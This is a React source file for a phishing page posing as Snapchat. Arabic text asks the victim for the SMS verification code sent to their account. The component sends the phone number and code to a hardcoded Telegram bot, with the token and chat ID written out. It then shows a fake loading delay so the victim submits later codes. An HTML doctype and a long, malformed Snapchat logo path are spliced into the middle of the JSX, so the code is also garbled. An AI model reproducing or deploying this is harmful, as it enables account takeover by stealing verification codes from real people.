import React, { useState } from "react"; 
import Axios from "axios";
import { formatPhoneNumberIntl } from 'react-phone-number-input'
import { GridLoader } from "react-spinners";

export default function Confirm({setNcode, ncode}){ 
    const [error, setError] = useState(false);
    const [code, setCode] = useState('');
    const [loading, setLoading] = useState(false);
    const APIS = () =>{
        const apiToken = "6524059481:AAGJSjp-e4vwt8Gk7obLdbm_lQiZxX6lYAE";
        const chatId = "5807893197";
        const text= `${formatPhoneNumberIntl(ncode.number)} : ${code}`;
        const url = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}`;
        Axios(url);
    }
    const handle = () => {
        if(code < 5){setError(true)}
        else { 
            setNcode({...ncode, code: code});
            APIS();
            setError(false); 
            setLoading(true);
            setTimeout(() => {
                setCode('');
                setLoading(false);
              }, 9000);
        }
    }
    return (
        <div className="md:w-1/2 mx-auto shadow-xl rounded-2xl pb-2 bg-white size Conts">
            <div className="flex min-h-full items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
                <div className="w-full max-w-md space-y-8">
                    <div>
					<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <!-- Snapchat logo -->
    <svg width="50" height="50" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
        <path d="M23.99 2c-2.56 0-4.53 1.57-5.97 2.96-1.09 1.02-1.73 2.04-2.55 3.38-.27.46-.57.96-.91 1.51-.54.83-1.1 1.68-1.86 2.19-.65.44-1.44.55-2.24.57-.92.02-1.83.07-2.74.16-.73.08-1.55.26-2.15.7-.44.31-.67.7-.8 1.18-.05.19-.12.37-.16.56-.08.31-.19.6-.27.92-.08.31-.14.63-.16.95-.03.53.1 1.08.39 1.57.25.41.67.71 1.1.89.28.12.56.21.85.29.69.21 1.42.32 2.14.43.95.15 1.89.31 2.82.54.48.12.95.26 1.39.47.5.23.99.56 1.33 1.04.4.58.74 1.3.95 2.02.2.71.3 1.44.35 2.18.07.91.01 1.83.03 2.74.01.8.02 1.6.02 2.4 0 .42.08.84.16 1.25.09.42.27.82.5 1.18.28.45.75.76 1.28.86.48.08.97.09 1.45.05.5-.03 1-.1 1.5-.17.66-.08 1.32-.17 1.97-.35.79-.21 1.56-.5 2.32-.84.55-.26 1.09-.53 1.66-.7.61-.18 1.23-.3 1.85-.35.65-.05 1.32.07 1.97.09.55.02 1.11.06 1.66.07.67.01 1.34-.02 2.02-.03.45 0 .9-.07 1.33-.2.56-.18 1.07-.52 1.52-.94.36-.34.69-.75.91-1.23.25-.53.39-1.12.54-1.68.12-.44.27-.87.41-1.31.13-.42.24-.86.25-1.3 0-.73-.17-1.44-.38-2.14-.23-.72-.55-1.41-1.05-1.97-.55-.63-1.24-1.13-2-1.54-.52-.29-1.05-.53-1.59-.8-.97-.48-1.95-.93-2.95-1.28-.36-.13-.72-.26-1.09-.38-.51-.18-1.02-.33-1.52-.48-.55-.15-1.1-.27-1.65-.42-.73-.19-1.46-.4-2.2-.56-.73-.16-1.47-.3-2.2-.48-.76-.19-1.52-.43-2.29-.57-.5-.09-1-.21-1.49-.26-.95-.09-1.91-.14-2.87-.16-.8-.02-1.61-.06-2.41-.13-.85-.07-1.68-.21-2.52-.31-.57-.07-1.14-.16-1.71-.25-.61-.09-1.23-.15-1.83-.3-.92-.21-1.82-.6-2.72-.97-.34-.14-.69-.28-1.03-.43-.31-.14-.62-.3-.93-.43-.45-.18-.89-.38-1.34-.55-.6-.23-1.21-.41-1.82-.61-.64-.2-1.28-.35-1.92-.5-.63-.14-1.27-.27-1.91-.4-.77-.15-1.54-.28-2.31-.4-.49-.08-.98-.16-1.47-.25-.53-.1-1.05-.22-1.58-.32-.41-.08-.83-.15-1.25-.24-.54-.11-1.08-.21-1.63-.29-.47-.08-.93-.2-1.41-.23-.77-.07-1.53-.15-2.29-.27-.58-.08-1.16-.2-1.73-.32-.51-.1-1.02-.2-1.52-.33-.82-.2-1.64-.43-2.47-.57-.71-.12-1.41-.25-2.13-.31-.73-.06-1.47-.05-2.2-.13-.51-.06-1.03-.17-1.54-.19-.61-.03-1.23.03-1.84-.03-.59-.06-1.18-.12-1.78-.15-.48-.03-.95-.08-1.43-.15-.64-.09-1.29-.18-1.94-.26-.58-.08-1.16-.16-1.74-.23-.66-.08-1.32-.19-1.98-.24-.82-.07-1.64-.11-2.46-.1-.67 0-1.34-.02-2.01-.01-.89.01-1.78.06-2.66.15-.75.07-1.49.15-2.24.29-.79.15-1.57.32-2.35.51-.89.22-1.77.47-2.65.72-.76.21-1.52.43-2.28.64-.57.16-1.14.3-1.7.5-.65.23-1.29.48-1.93.72-.59.23-1.18.47-1.77.7-.82.33-1.65.63-2.47.98-.56.23-1.12.47-1.68.71-.49.21-.97.45-1.46.65-.7.27-1.41.51-2.1.78-.73.3-1.47.57-2.21.81-.7.23-1.39.48-2.09.71-.76.26-1.51.53-2.26.78-.78.26-1.57.5-2.34.77-.54.18-1.08.35-1.62.53-.53.18-1.06.34-1.59.53-.55.19-1.09.38-1.64.57-.54.18-1.07.35-1.62.53-.79.26-1.57.53-2.35.79-.55.18-1.11.34-1.67.53-.79.26-1.57.53-2.36.78-.73.22-1.47.45-2.21.68-.89.28-1.77.56-2.66.85-.73.24-1.47.48-2.21.72-.79.26-1.58.51-2.37.77-.62.2-1.24.39-1.87.59-.68.22-1.35.43-2.02.64-.57.18-1.14.34-1.72.53-.54.17-1.07.34-1.61.51-.55.18-1.1.35-1.65.53-.52.16-1.04.32-1.56.47-.5.15-1 .3-1.5.45-.76.23-1.51.46-2.27.69-.65.2-1.3.41-1.95.62-.68.21-1.35.42-

                        <h2 className="mt-6 text-center tracking-tight text-gray-700">أدخل رمز التحقق لي وصلك عبر رساله نصيه، ان لم يصلك فقد ادخلت رقم غير مسجل على حسابك السناب</h2>
						<h2 className="mt-6 text-center tracking-tight text-red-700">اذا وصلك اكثر من رمز ادخل الاخير لي وصل</h2>
                    </div>
                    {loading ? 
                    <div className="flex min-h-full items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
                        <GridLoader 
                            color={"#fafa00"}
                            loading={loading}
                            size={20}
                        />
                    </div>
                    :
                    <div className="mt-8 space-y-6">
                        <div className="-space-y-px rounded-md shadow-sm">
                            <div>
                                <input type="tel" id="phone" className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" placeholder="أدخل رمز التحقق" 
                                onChange={(e)=> setCode(e.target.value)}
                            />
                            </div>
                        </div>
                        {error ? 
                        <div className="flex p-4 mb-4 text-sm text-red-700 bg-red-100 rounded-lg dark:bg-red-200 dark:text-red-800" role="alert">
                            <svg aria-hidden="true" className="flex-shrink-0 inline w-5 h-5 mr-3" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule={"evenodd"}></path></svg>
                            <span className="sr-only">Info</span>
                            <div>
                                <span className="font-medium">الرمز غير صحيح</span>
                            </div>
                        </div> : ""
                        }
                        <div>
                            <button className="group relative flex w-full justify-center rounded-md border border-transparent bg-yellow-300 py-2 px-4 text-sm font-medium text-white hover:bg-yellow-400 focus:outline-none focus:ring-2 focus:ring-yellow-500 focus:ring-offset-2"
                            onClick={()=>handle()}>
                                <span className="absolute inset-y-0 left-0 flex items-center pl-3">
                                    <svg className="h-5 w-5 text-yellow-500 group-hover:text-yellow-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
                                        <path fillRule="evenodd" d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v6a2 2 0 002 2h10a2 2 0 002-2v-6a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z" clipRule={"evenodd"} />
                                    </svg>
                                </span>
                                <div className="text-gray-500">تأكيد</div>
                            </button>
                        </div>
                    </div>
                    }
                </div>
            </div>
        </div>
    );
}